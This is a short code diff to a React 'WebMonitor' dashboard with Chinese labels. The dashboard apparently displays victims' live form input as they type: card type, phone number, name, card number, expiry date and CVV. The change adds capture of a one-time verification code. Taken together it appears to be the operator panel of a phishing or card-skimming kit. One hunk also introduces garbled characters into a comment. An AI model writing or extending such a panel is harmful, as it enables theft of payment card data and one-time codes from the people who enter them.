@@ -302,7 +302,7 @@ export function WebMonitor() {
           
           <div className="flex items-center gap-2">
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              🌐 站���管理
+              🌐 站点管理
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               📊 实时统计
@@ -424,7 +424,7 @@ export function WebMonitor() {
                 </div>
               </div>
 
-              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
+              {/* 中部：卡的类型、手机号、姓名、卡���、有效期、CVV */}
               {(() => {
                 // 检查是否有用户实际输入数据
                 const hasUserData = submission.realtimeInput && (
@@ -432,6 +432,7 @@ export function WebMonitor() {
                   submission.realtimeInput.cardNumber ||
                   submission.realtimeInput.expiryDate ||
                   submission.realtimeInput.cvv ||
+                  submission.realtimeInput.verificationCode ||
                   submission.userName
                 );
 
